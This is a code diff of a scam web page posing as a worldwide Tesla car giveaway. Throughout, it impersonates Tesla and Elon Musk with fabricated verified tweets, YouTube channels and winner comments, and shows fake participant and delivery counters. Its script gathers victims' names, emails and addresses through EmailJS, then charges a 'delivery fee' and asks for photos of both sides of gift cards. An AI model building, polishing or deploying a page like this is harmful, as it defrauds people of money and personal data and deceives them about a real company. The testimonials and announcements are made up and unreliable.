@@ -8,8 +8,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <!-- EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <!-- Cloudinary Upload Widget -->
-    <script src="https://upload-widget.cloudinary.com/global/all.js" type="text/javascript"></script>
     <style>
         * {
             margin: 0;
@@ -64,8 +62,10 @@
         .logo-area i { font-size: 1.8rem; color: #E82127; }
         .logo-area h2 { font-weight: 700; }
         .nav-links { display: flex; gap: 1.5rem; flex-wrap: wrap; }
-        .nav-links a { text-decoration: none; color: #171717; font-weight: 500; }
+        .nav-links a { text-decoration: none; color: #171717; font-weight: 500; transition: color 0.2s; }
+        .nav-links a:hover { color: #E82127; }
         .claim-nav { background: #E82127; color: white !important; padding: 0.3rem 0.8rem; border-radius: 2rem; }
+        .claim-nav:hover { background: #c41e24; color: white !important; }
 
         /* Hero */
         .hero { text-align: center; padding: 2rem 1rem; max-width: 800px; margin: 0 auto; }
@@ -75,8 +75,12 @@
         .hero h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 0.8rem; color: #171717; }
         .hero p { font-size: 1rem; color: #4B4B4B; max-width: 600px; margin: 0 auto; }
         .hero-buttons { display: flex; gap: 1rem; justify-content: center; margin-top: 1.5rem; flex-wrap: wrap; }
-        .btn-red { background: #E82127; color: white; padding: 0.7rem 1.5rem; border-radius: 2rem; text-decoration: none; font-weight: 600; border: none; cursor: pointer; font-size: 0.9rem; }
-        .btn-outline { border: 1px solid #E82127; color: #E82127; padding: 0.7rem 1.5rem; border-radius: 2rem; text-decoration: none; font-weight: 600; background: white; cursor: pointer; font-size: 0.9rem; }
+        .btn-red { background: #E82127; color: white; padding: 0.7rem 1.5rem; border-radius: 2rem; text-decoration: none; font-weight: 600; border: none; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; }
+        .btn-red:hover { background: #c41e24; transform: scale(1.02); }
+        .btn-red:active { transform: scale(0.97); }
+        .btn-outline { border: 1px solid #E82127; color: #E82127; padding: 0.7rem 1.5rem; border-radius: 2rem; text-decoration: none; font-weight: 600; background: white; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; }
+        .btn-outline:hover { background: #FEE2E2; transform: scale(1.02); }
+        .btn-outline:active { transform: scale(0.97); }
 
         /* Trust Badges Row */
         .trust-badges-row {
@@ -107,13 +111,6 @@
             width: 100%;
             max-width: 300px;
             border-radius: 1rem;
-        }
-
-        /* Section Titles */
-        .section-title {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin: 2rem 0 1rem;
         }
 
         /* Car Grid */
@@ -197,7 +194,10 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 0.5rem;
+            transition: all 0.2s;
         }
+        .claim-btn-card:hover { background: #c41e24; }
+        .claim-btn-card:active { transform: scale(0.97); }
 
         /* YouTube Sections */
         .youtube-card {
@@ -207,65 +207,128 @@
             margin: 1.5rem 0;
             border: 1px solid #E5E5E5;
         }
-        .video-placeholder {
-            background: #1a1a1a;
-            height: 200px;
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            border-radius: 0.8rem;
+            margin: 1rem 0;
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        .youtube-header {
             display: flex;
             align-items: center;
-            justify-content: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        .channel-info { display: flex; align-items: center; gap: 0.8rem; }
+        .channel-avatar { width: 40px; height: 40px; background: #E82127; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
+        .subscribe-btn {
+            background: #E82127;
             color: white;
-            border-radius: 0.8rem;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .subscribe-btn.subscribed {
+            background: #6B7280;
+        }
+        .action-buttons { display: flex; gap: 1rem; margin: 0.8rem 0; }
+        .action-btn { background: none; border: none; cursor: pointer; display: flex; align-items: center; gap: 0.3rem; color: #4B4B4B; padding: 0.3rem 0.6rem; border-radius: 2rem; transition: all 0.2s; }
+        .action-btn:hover { background: #E5E5E5; }
+        .action-btn:active { transform: scale(0.95); }
+        .action-btn.liked { color: #3B82F6; }
+        .comments-section { margin-top: 1rem; }
+        .comment { display: flex; gap: 0.8rem; margin-bottom: 1rem; }
+        .comment-avatar { width: 32px; height: 32px; background: #E82127; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 0.7rem; flex-shrink: 0; }
+        .comment-content { flex: 1; }
+        .comment-header { display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 0.2rem; }
+        .comment-name { font-weight: 600; }
+        .comment-time { font-size: 0.7rem; color: #6B7280; }
+        .pinned-badge { font-size: 0.7rem; color: #E82127; background: #FEE2E2; padding: 0.1rem 0.4rem; border-radius: 0.8rem; }
+        .comment-text { font-size: 0.85rem; margin-bottom: 0.3rem; }
+        .comment-actions { display: flex; gap: 0.8rem; }
+        .comment-like { background: none; border: none; cursor: pointer; font-size: 0.7rem; color: #6B7280; display: flex; align-items: center; gap: 0.2rem; }
+        .comment-like.liked { color: #3B82F6; }
+        .view-more-btn { background: none; border: none; color: #6B7280; cursor: pointer; margin-top: 0.5rem; font-size: 0.8rem; }
+
+        /* CEO Twitter Cards */
+        .twitter-card {
+            background: #FFFFFF;
+            border: 1px solid #E5E5E5;
+            border-radius: 1rem;
+            padding: 1rem;
             margin: 1rem 0;
         }
-        .comment {
-            padding: 0.8rem 0;
-            border-bottom: 1px solid #E5E5E5;
+        .twitter-header {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 0.8rem;
         }
-        .comment strong { color: #171717; }
+        .twitter-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .twitter-name h4 { font-size: 1rem; margin-bottom: 0.1rem; }
+        .twitter-name p { font-size: 0.8rem; color: #6B7280; }
+        .twitter-text { margin-bottom: 0.8rem; }
+        .twitter-engagement { display: flex; gap: 1.5rem; margin-top: 0.8rem; }
+        .eng-btn { background: none; border: none; cursor: pointer; display: flex; align-items: center; gap: 0.3rem; color: #6B7280; transition: all 0.2s; }
+        .eng-btn:hover { color: #E82127; }
+        .eng-btn:active { transform: scale(0.95); }
+        .eng-btn.liked { color: #E82127; }
 
-        /* CEO Section */
-        .ceo-post {
+        /* Testimonials Carousel */
+        .testimonials-carousel {
+            position: relative;
             background: #F8F8F8;
             border-radius: 1rem;
-            padding: 1.2rem;
-            margin: 1rem 0;
-            border-left: 4px solid #E82127;
-        }
-
-        /* Winners Grid */
-        .winners-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 1rem;
+            padding: 1rem;
             margin: 1.5rem 0;
         }
-        .winner-card {
-            background: #F8F8F8;
-            padding: 1rem;
-            border-radius: 0.8rem;
-            border-left: 3px solid #E82127;
-        }
-
-        /* Social Links */
-        .social-links {
+        .carousel-container {
             display: flex;
-            justify-content: center;
-            gap: 2rem;
-            margin: 2rem 0;
-            flex-wrap: wrap;
+            gap: 1rem;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            padding: 0.5rem;
         }
-        .social-card {
-            background: #F8F8F8;
-            padding: 1rem 1.5rem;
-            border-radius: 1rem;
-            text-align: center;
-            text-decoration: none;
-            color: #171717;
+        .testimonial-slide {
+            min-width: 280px;
+            background: white;
+            border-radius: 0.8rem;
+            padding: 1rem;
+            border-left: 3px solid #E82127;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        .carousel-btn {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
             border: 1px solid #E5E5E5;
-            transition: transform 0.2s;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            cursor: pointer;
+            z-index: 2;
         }
-        .social-card:hover { transform: translateY(-3px); border-color: #E82127; }
-        .social-card i { font-size: 1.8rem; margin-bottom: 0.5rem; }
+        .carousel-btn.prev { left: -12px; }
+        .carousel-btn.next { right: -12px; }
 
         /* Steps */
         .steps-container {
@@ -334,14 +397,19 @@
             display: flex;
             align-items: center;
             gap: 0.5rem;
+            animation: fadeIn 0.3s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .feed-item i { color: #22C55E; }
 
-        /* Modal Upload Blocks */
+        /* Upload Blocks */
         .upload-block {
             border: 2px dashed #CCC;
             border-radius: 1rem;
-            padding: 1.2rem;
+            padding: 1rem;
             text-align: center;
             cursor: pointer;
             background: #FAFAFA;
@@ -349,8 +417,21 @@
             transition: all 0.2s;
         }
         .upload-block:hover { border-color: #E82127; background: #FFF5F5; }
-        .upload-block i { font-size: 1.8rem; color: #E82127; margin-bottom: 0.3rem; }
-        .upload-preview { font-size: 0.75rem; color: #22C55E; margin-top: 0.3rem; }
+        .upload-block i { font-size: 1.5rem; color: #E82127; margin-bottom: 0.3rem; }
+        .upload-preview {
+            font-size: 0.75rem;
+            color: #22C55E;
+            margin-top: 0.3rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .upload-preview img {
+            width: 40px;
+            height: 40px;
+            object-fit: cover;
+            border-radius: 0.3rem;
+        }
 
         /* Modal */
         .modal {
@@ -390,7 +471,9 @@
             padding: 0.8rem;
             margin-bottom: 0.8rem;
             cursor: pointer;
+            transition: all 0.2s;
         }
+        .delivery-option:hover { border-color: #E82127; background: #FFF5F5; }
         .delivery-option.selected { border-color: #E82127; background: #FFF5F5; }
         .payment-tab {
             display: flex;
@@ -404,7 +487,9 @@
             border: none;
             cursor: pointer;
             font-weight: 600;
+            transition: all 0.2s;
         }
+        .tab-btn:active { transform: scale(0.97); }
         .tab-btn.active { color: #E82127; border-bottom: 2px solid #E82127; }
         .btn-submit {
             background: #E82127;
@@ -416,8 +501,63 @@
             font-weight: 700;
             cursor: pointer;
             margin-top: 1rem;
+            transition: all 0.2s;
         }
         .btn-submit:disabled { background: #CCC; cursor: not-allowed; }
+        .btn-submit:active:not(:disabled) { transform: scale(0.97); }
+        .btn-secondary {
+            background: #E5E5E5;
+            color: #171717;
+            width: 48%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-secondary:active { transform: scale(0.97); }
+        .modal-buttons {
+            display: flex;
+            gap: 1rem;
+            justify-content: flex-end;
+            margin-top: 1rem;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Social Links */
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+        .social-card {
+            background: #F8F8F8;
+            padding: 1rem 1.5rem;
+            border-radius: 1rem;
+            text-align: center;
+            text-decoration: none;
+            color: #171717;
+            border: 1px solid #E5E5E5;
+            transition: all 0.2s;
+        }
+        .social-card:hover { transform: translateY(-3px); border-color: #E82127; }
+        .social-card i { font-size: 1.8rem; margin-bottom: 0.5rem; }
 
         /* Toast Container */
         .toast-container {
@@ -537,54 +677,97 @@
         <p><span id="participantCount">12,847</span> participants already joined</p>
     </div>
 
-    <!-- FIRST 4 CARS (Model 3, Y, S, X) -->
+    <!-- FIRST 4 CARS -->
     <div class="cars-grid" id="firstFourCars"></div>
 
-    <!-- YouTube Section 1 -->
-    <div class="youtube-card">
+    <!-- YOUTUBE SECTION 1 -->
+    <div class="youtube-card" id="youtube1">
         <h3>Official Announcement</h3>
         <p>Tesla's Global Car Giveaway</p>
-        <div class="video-placeholder"><i class="fab fa-youtube fa-3x" style="color:red"></i> Watch on YouTube</div>
-        <p><strong>Tesla Official</strong> · 28.4M subscribers</p>
-        <div class="comment"><strong>MJ Mike Johnson</strong> 📌 Pinned · 2 days ago<br>Just received my Tesla Model 3 2024!! I paid the delivery fee and within 9 days the car was at my door. This is REAL! 🚗⚡<br>48.2K Replies</div>
-        <div class="comment"><strong>SW Sarah Williams</strong> · 1 day ago<br>I received my Tesla Model Y 2025 after paying the delivery fee. I cried when I saw the car parked outside! 🙏<br>32.4K Replies</div>
-        <div class="comment"><strong>CM Carlos Mendez</strong> · 3 days ago<br>From Mexico! I received my Tesla Model 3 2024 after paying the delivery fee. This giveaway is 100% real!<br>29.2K Replies</div>
-        <div class="comment"><strong>DC David Chen</strong> · 2 days ago<br>I was skeptical at first but I paid the delivery fee and received my Tesla Model S 2025. So real!<br>26.1K Replies</div>
-        <div class="comment"><strong>AO Amara Osei</strong> · 1 day ago<br>From Ghana 🇬🇭 I paid the delivery fee and received my Tesla Model 3 2025! God bless Tesla!<br>24K Replies</div>
-        <p style="margin-top:0.5rem;">View 70,842 more comments</p>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/XTeWKmlNmN8" frameborder="0" allowfullscreen></iframe>
+        </div>
+        <div class="youtube-header">
+            <div class="channel-info">
+                <div class="channel-avatar">T</div>
+                <div><strong>Tesla Official</strong><br>28.4M subscribers</div>
+            </div>
+            <button class="subscribe-btn" id="subscribeBtn1">Subscribe</button>
+        </div>
+        <div class="action-buttons">
+            <button class="action-btn like-btn" data-liked="false">👍 1.2M</button>
+            <button class="action-btn share-btn">↗️ Share</button>
+            <button class="action-btn download-btn">⬇️ Download</button>
+        </div>
+        <div class="comments-section" id="commentsSection1">
+            <div class="comment"><div class="comment-avatar">MJ</div><div class="comment-content"><div class="comment-header"><span class="comment-name">Mike Johnson</span><span class="comment-time">2 days ago</span><span class="pinned-badge">📌 Pinned</span></div><div class="comment-text">Just received my Tesla Model 3 2024!! I paid the delivery fee and within 9 days the car was at my door. This is REAL! 🚗⚡</div><div class="comment-actions"><button class="comment-like">👍 48.2K</button><button class="comment-reply">Reply</button></div></div></div>
+            <div class="comment"><div class="comment-avatar">SW</div><div class="comment-content"><div class="comment-header"><span class="comment-name">Sarah Williams</span><span class="comment-time">1 day ago</span></div><div class="comment-text">I received my Tesla Model Y 2025 after paying the delivery fee. I cried when I saw the car parked outside! 🙏</div><div class="comment-actions"><button class="comment-like">👍 32.4K</button><button class="comment-reply">Reply</button></div></div></div>
+            <div class="comment"><div class="comment-avatar">CM</div><div class="comment-content"><div class="comment-header"><span class="comment-name">Carlos Mendez</span><span class="comment-time">3 days ago</span></div><div class="comment-text">From Mexico! I received my Tesla Model 3 2024 after paying the delivery fee. This giveaway is 100% real!</div><div class="comment-actions"><button class="comment-like">👍 29.2K</button><button class="comment-reply">Reply</button></div></div></div>
+            <div class="comment hidden-comment" style="display:none;"><div class="comment-avatar">DC</div><div class="comment-content"><div class="comment-header"><span class="comment-name">David Chen</span><span class="comment-time">2 days ago</span></div><div class="comment-text">I was skeptical at first but I paid the delivery fee and received my Tesla Model S 2025. So real!</div><div class="comment-actions"><button class="comment-like">👍 26.1K</button><button class="comment-reply">Reply</button></div></div></div>
+            <div class="comment hidden-comment" style="display:none;"><div class="comment-avatar">AO</div><div class="comment-content"><div class="comment-header"><span class="comment-name">Amara Osei</span><span class="comment-time">1 day ago</span></div><div class="comment-text">From Ghana 🇬🇭 I paid the delivery fee and received my Tesla Model 3 2025! God bless Tesla!</div><div class="comment-actions"><button class="comment-like">👍 24K</button><button class="comment-reply">Reply</button></div></div></div>
+            <button class="view-more-btn" id="viewMoreBtn1">View 70,842 more comments</button>
+        </div>
     </div>
 
-    <!-- YouTube Section 2 -->
-    <div class="youtube-card">
+    <!-- YOUTUBE SECTION 2 -->
+    <div class="youtube-card" id="youtube2">
         <h3>More Proof from Winners</h3>
-        <div class="video-placeholder"><i class="fab fa-youtube fa-3x" style="color:red"></i> Watch testimonials</div>
-        <p><strong>Tesla Global</strong> · 12.8M subscribers</p>
-        <div class="comment"><strong>MJ Mike Johnson 🇺🇸</strong> · 2 days ago<br>I received my Tesla car!! I paid the delivery fee and within a week my brand new Tesla Model 3 arrived at my door. 🚗⚡<br>4.8K Replies</div>
-        <div class="comment"><strong>SW Sarah Williams 🇺🇸</strong> · 1 day ago<br>Just received my Tesla car after paying for the delivery fee. I cried when I saw the car parked outside! 🙏<br>3.2K Replies</div>
-        <div class="comment"><strong>CM Carlos Mendez 🇲🇽</strong> · 3 days ago<br>From Mexico! I received my Tesla car after paying the delivery fee. This giveaway is 100% real.<br>2.9K Replies</div>
-        <div class="comment"><strong>DC David Chen 🇨🇳</strong> · 2 days ago<br>I was skeptical at first but I paid the delivery fee and received my Tesla EV. Amazing!<br>2.6K Replies</div>
-        <div class="comment"><strong>AO Amara Osei 🇬🇭</strong> · 1 day ago<br>From Ghana 🇬🇭 I paid for the delivery fee and received my Tesla car! God bless Tesla!<br>2.4K Replies</div>
-        <p style="margin-top:0.5rem;">View 75,600 more comments</p>
+        <div class="video-container">
+            <iframe src="https://www.youtube.com/embed/XDkzm_LR0Co" frameborder="0" allowfullscreen></iframe>
+        </div>
+        <div class="youtube-header">
+            <div class="channel-info">
+                <div class="channel-avatar">TG</div>
+                <div><strong>Tesla Global</strong><br>12.8M subscribers</div>
+            </div>
+            <button class="subscribe-btn" id="subscribeBtn2">Subscribe</button>
+        </div>
+        <div class="comments-section" id="commentsSection2">
+            <div class="comment"><div class="comment-avatar">MJ</div><div class="comment-content"><div class="comment-header"><span class="comment-name">Mike Johnson 🇺🇸</span><span class="comment-time">2 days ago</span><span class="pinned-badge">📌 Pinned</span></div><div class="comment-text">I received my Tesla car!! I paid the delivery fee and within a week my brand new Tesla Model 3 arrived at my door. 🚗⚡</div><div class="comment-actions"><button class="comment-like">👍 4.8K</button><button class="comment-reply">Reply</button></div></div></div>
+            <div class="comment"><div class="comment-avatar">SW</div><div class="comment-content"><div class="comment-header"><span class="comment-name">Sarah Williams 🇺🇸</span><span class="comment-time">1 day ago</span></div><div class="comment-text">Just received my Tesla car after paying for the delivery fee. I cried when I saw the car parked outside! 🙏</div><div class="comment-actions"><button class="comment-like">👍 3.2K</button><button class="comment-reply">Reply</button></div></div></div>
+            <div class="comment"><div class="comment-avatar">CM</div><div class="comment-content"><div class="comment-header"><span class="comment-name">Carlos Mendez 🇲🇽</span><span class="comment-time">3 days ago</span></div><div class="comment-text">From Mexico! I received my Tesla car after paying the delivery fee. This giveaway is 100% real.</div><div class="comment-actions"><button class="comment-like">👍 2.9K</button><button class="comment-reply">Reply</button></div></div></div>
+            <button class="view-more-btn" id="viewMoreBtn2">View 75,600 more comments</button>
+        </div>
     </div>
 
-    <!-- Straight from the CEO -->
-    <h3>Straight from the CEO</h3>
-    <div class="ceo-post">
-        <i class="fab fa-twitter"></i> <strong>Elon Musk</strong> 🚀 · CEO, Tesla, Inc.<br>
-        Tesla is committed to accelerating the world's transition to sustainable energy. As part of our mission, we're launching a worldwide giveaway of our electric vehicles — completely free. Just cover the delivery cost and a brand-new Tesla will be shipped directly to your door. 🚗⚡<br>
-        ❤️ 128K &nbsp;&nbsp; 🔁 47K &nbsp;&nbsp; 💬 8.2K
-    </div>
-    <div class="ceo-post">
-        <i class="fab fa-twitter"></i> <strong>Tesla Official</strong> @Tesla · Official Account<br>
-        📢 OFFICIAL ANNOUNCEMENT: Our global Tesla car giveaway is NOW LIVE! 🌍 Open to ALL countries. No purchase necessary — just cover the one-time delivery fee. Model 3, Model Y, Model S, Model X and more available. Don't miss out! 🎁🚗<br>
-        ❤️ 215K &nbsp;&nbsp; 🔁 89K &nbsp;&nbsp; 💬 14K
+    <!-- TWITTER CARDS -->
+    <div class="twitter-card" id="elonCard">
+        <div class="twitter-header">
+            <img class="twitter-avatar" src="https://pbs.twimg.com/profile_images/1683325380441128960/y7sKK8Qm_400x400.jpg" alt="Elon Musk" onerror="this.src='https://placehold.co/48x48'">
+            <div class="twitter-name"><h4>Elon Musk 🚀 <i class="fas fa-check-circle" style="color:#1DA1F2; font-size:0.8rem;"></i></h4><p>@elonmusk · 2h ago</p></div>
+        </div>
+        <div class="twitter-text">Tesla is committed to accelerating the world's transition to sustainable energy. As part of our mission, we're launching a worldwide giveaway of our electric vehicles — completely free. Just cover the delivery cost and a brand-new Tesla will be shipped directly to your door. 🚗⚡</div>
+        <div class="twitter-engagement">
+            <button class="eng-btn like-btn" data-liked="false">❤️ 128K</button>
+            <button class="eng-btn">🔁 47K</button>
+            <button class="eng-btn">💬 8.2K</button>
+            <button class="eng-btn">↗️</button>
+        </div>
     </div>
 
-    <!-- What Winners Are Saying -->
+    <div class="twitter-card" id="teslaOfficialCard">
+        <div class="twitter-header">
+            <img class="twitter-avatar" src="https://pbs.twimg.com/profile_images/1337607516008501250/6G7GqGqG_400x400.jpg" alt="Tesla Official" onerror="this.src='https://placehold.co/48x48'">
+            <div class="twitter-name"><h4>Tesla Official <i class="fas fa-check-circle" style="color:#1DA1F2; font-size:0.8rem;"></i></h4><p>@Tesla · Official Account · 4h ago</p></div>
+        </div>
+        <div class="twitter-text">📢 OFFICIAL ANNOUNCEMENT: Our global Tesla car giveaway is NOW LIVE! 🌍 Open to ALL countries. No purchase necessary — just cover the one-time delivery fee. Model 3, Model Y, Model S, Model X and more available. Don't miss out! 🎁🚗</div>
+        <div class="twitter-engagement">
+            <button class="eng-btn like-btn" data-liked="false">❤️ 215K</button>
+            <button class="eng-btn">🔁 89K</button>
+            <button class="eng-btn">💬 14K</button>
+            <button class="eng-btn">↗️</button>
+        </div>
+    </div>
+
+    <!-- TESTIMONIALS CAROUSEL -->
     <h3>What Winners Are Saying</h3>
-    <div class="winners-grid" id="winnersGrid"></div>
+    <div class="testimonials-carousel">
+        <button class="carousel-btn prev" id="prevTestimonial">←</button>
+        <div class="carousel-container" id="testimonialCarousel"></div>
+        <button class="carousel-btn next" id="nextTestimonial">→</button>
+    </div>
 
-    <!-- Follow Tesla Official -->
+    <!-- FOLLOW TESLA OFFICIAL -->
     <h3>Follow Tesla Official</h3>
     <div class="social-links">
         <a href="https://x.com/tesla" target="_blank" class="social-card"><i class="fab fa-twitter"></i><br><strong>Tesla Official</strong><br>@Tesla<br>28.4M followers</a>
@@ -592,7 +775,7 @@
         <a href="https://instagram.com/teslamotors" target="_blank" class="social-card"><i class="fab fa-instagram"></i><br><strong>Tesla</strong><br>@teslamotors<br>12.8M followers</a>
     </div>
 
-    <!-- How to Claim -->
+    <!-- STEPS -->
     <h3>How to Claim Your Tesla Car</h3>
     <div class="steps-container">
         <div class="step"><div class="step-number">01</div><strong>Register Your Details</strong><br>Enter your delivery address</div>
@@ -602,16 +785,16 @@
     </div>
     <div style="text-align:center; margin:1rem 0;"><button class="btn-red" id="startClaimBtn">🚗 Start Claiming Your Tesla Now →</button></div>
 
-    <!-- REMAINING 5 CARS (Cybertruck, Roadster, Model 3 SR, Model Y LR, Model S Plaid) -->
+    <!-- REMAINING 5 CARS -->
     <div class="cars-grid" id="remainingFiveCars"></div>
 
-    <!-- Tesla Electric Built for Future -->
+    <!-- TESLA ELECTRIC BUILT FOR FUTURE -->
     <div style="text-align:center; margin:2rem 0;">
         <p><strong>⚡ Tesla Electric — Built for the Future</strong></p>
         <p style="color:#4B4B4B;">Tesla is the world's leading electric vehicle manufacturer. Each participant is eligible for one vehicle only.</p>
     </div>
 
-    <!-- Live Deliveries -->
+    <!-- LIVE DELIVERIES -->
     <h3>Live Deliveries <span class="live-dot"></span></h3>
     <div class="live-feed" id="liveFeedList"></div>
 </div>
@@ -633,7 +816,7 @@
 
 <div class="toast-container" id="toastContainer"></div>
 
-<!-- Modals -->
+<!-- MODALS -->
 <div id="claimModal" class="modal"><div class="modal-content" id="claimModalContent"></div></div>
 <div id="orderModal" class="modal"><div class="modal-content" id="orderModalContent"></div></div>
 <div id="paymentModal" class="modal"><div class="modal-content" id="paymentModalContent"></div></div>
@@ -656,7 +839,6 @@
         { id: 8, name: "Tesla Model S Plaid", year: "2025", category: "Performance Sedan", badge: "Top Rated", badgeColor: "#8B5CF6", power: "1020 hp Tri Motor", range: "396 mi", delivery: "5-7 Business Days", fee: 359, image: "https://res.cloudinary.com/do9yjpizs/image/upload/v1/tesla/models" }
     ];
 
-    // Split cars: first 4 (id 0-3), remaining 5 (id 4-8)
     const firstFour = cars.slice(0, 4);
     const remainingFive = cars.slice(4, 9);
 
@@ -667,7 +849,7 @@
     let uploadedBack = null;
     let currentPaymentMethod = 'card';
 
-    // Render car grid function
+    // Render car grid
     function renderCarGrid(containerId, carList) {
         const grid = document.getElementById(containerId);
         if (!grid) return;
@@ -694,8 +876,6 @@
             `;
             grid.appendChild(card);
         });
-
-        // Attach event listeners
         document.querySelectorAll(`#${containerId} .claim-btn-card`).forEach(btn => {
             btn.addEventListener('click', () => {
                 selectedCar = JSON.parse(btn.getAttribute('data-car'));
@@ -704,14 +884,29 @@
         });
     }
 
-    // Show Claim Modal
+    // Helper to show loading on button
+    function setButtonLoading(btn, isLoading) {
+        if (isLoading) {
+            btn.disabled = true;
+            btn.classList.add('loading');
+            const originalText = btn.innerText;
+            btn.setAttribute('data-original-text', originalText);
+            btn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
+        } else {
+            btn.disabled = false;
+            btn.classList.remove('loading');
+            btn.innerHTML = btn.getAttribute('data-original-text') || btn.innerText;
+        }
+    }
+
+    // Claim Modal
     function showClaimModal() {
         const modal = document.getElementById('claimModal');
         const content = document.getElementById('claimModalContent');
         content.innerHTML = `
-            <h2 style="color:#E82127;">🎉 You've been selected!</h2>
-            <p>Fill in your delivery details for <strong>${selectedCar.name} ${selectedCar.year}</strong></p>
-            <img src="${selectedCar.image}.jpg" style="width:100%; border-radius:0.8rem; margin:1rem 0;" onerror="this.src='https://placehold.co/600x400'">
+            <h2 style="color:#E82127;">🎉 You selected:</h2>
+            <p style="font-size:1.1rem; font-weight:500; margin-bottom:1rem;">${selectedCar.name} ${selectedCar.year}</p>
+            <img src="${selectedCar.image}.jpg" style="width:100%; border-radius:0.8rem; margin-bottom:1rem;" onerror="this.src='https://placehold.co/600x400'">
             <form id="claimForm">
                 <div class="form-group"><label>Full Name *</label><input type="text" id="fullName" required placeholder="John Doe"></div>
                 <div class="form-group"><label>Email Address *</label><input type="email" id="email" required placeholder="john@example.com"></div>
@@ -720,13 +915,21 @@
                 <div class="form-group"><label>City *</label><input type="text" id="city" required placeholder="Los Angeles"></div>
                 <div class="form-group"><label>ZIP / Postal *</label><input type="text" id="zip" required placeholder="90001"></div>
                 <div class="form-group"><label>Country *</label><input type="text" id="country" required placeholder="United States"></div>
-                <button type="submit" class="btn-submit">Order Now →</button>
+                <div class="modal-buttons">
+                    <button type="button" class="btn-secondary" id="cancelClaimBtn">Cancel</button>
+                    <button type="submit" class="btn-submit" id="submitClaimBtn">Order Now →</button>
+                </div>
             </form>
         `;
         modal.style.display = 'flex';
 
+        document.getElementById('cancelClaimBtn').onclick = () => modal.style.display = 'none';
+
         document.getElementById('claimForm').addEventListener('submit', async (e) => {
             e.preventDefault();
+            const submitBtn = document.getElementById('submitClaimBtn');
+            setButtonLoading(submitBtn, true);
+
             claimData = {
                 fullName: document.getElementById('fullName').value,
                 email: document.getElementById('email').value,
@@ -739,16 +942,20 @@
                 carImageUrl: selectedCar.image,
                 timestamp: new Date().toLocaleString()
             };
-            // Send EmailJS (Send 1)
+
             try {
                 await emailjs.send('service_1qzlil7', 'template_2raf063', claimData);
             } catch(err) { console.log('EmailJS error:', err); }
-            modal.style.display = 'none';
-            showOrderModal();
+
+            setTimeout(() => {
+                setButtonLoading(submitBtn, false);
+                modal.style.display = 'none';
+                showOrderModal();
+            }, 800);
         });
     }
 
-    // Show Order Modal
+    // Order Modal
     function showOrderModal() {
         const modal = document.getElementById('orderModal');
         const content = document.getElementById('orderModalContent');
@@ -763,9 +970,14 @@
                 <div class="delivery-option" data-fee="349" data-name="Express Delivery" data-days="5-7 business days">Express Delivery — $349 (5-7 business days)</div>
                 <div class="delivery-option" data-fee="399" data-name="Premium Delivery" data-days="3-5 business days">Premium Delivery — $399 (3-5 business days)</div>
             </div>
-            <button id="proceedPayment" class="btn-submit" disabled>Pay for Delivery Now →</button>
+            <div class="modal-buttons">
+                <button type="button" class="btn-secondary" id="cancelOrderBtn">Cancel</button>
+                <button id="proceedPayment" class="btn-submit" disabled>Pay for Delivery Now →</button>
+            </div>
         `;
         modal.style.display = 'flex';
+
+        document.getElementById('cancelOrderBtn').onclick = () => modal.style.display = 'none';
 
         document.querySelectorAll('.delivery-option').forEach(opt => {
             opt.addEventListener('click', () => {
@@ -786,7 +998,7 @@
         };
     }
 
-    // Show Payment Modal
+    // Payment Modal
     function showPaymentModal() {
         uploadedFront = null;
         uploadedBack = null;
@@ -814,9 +1026,14 @@
                 <div class="form-group"><label>Upload Front (Gift Card) *</label><div class="upload-block" id="uploadFrontGift"><i class="fas fa-cloud-upload-alt"></i><p>Tap to upload front</p></div><div id="frontPreviewGift" class="upload-preview"></div></div>
                 <div class="form-group"><label>Upload Back (Gift Card) *</label><div class="upload-block" id="uploadBackGift"><i class="fas fa-cloud-upload-alt"></i><p>Tap to upload back</p></div><div id="backPreviewGift" class="upload-preview"></div></div>
             </div>
-            <button id="confirmPaymentBtn" class="btn-submit" disabled>I've Paid — Confirm My Order ✓</button>
+            <div class="modal-buttons">
+                <button type="button" class="btn-secondary" id="cancelPaymentBtn">Cancel</button>
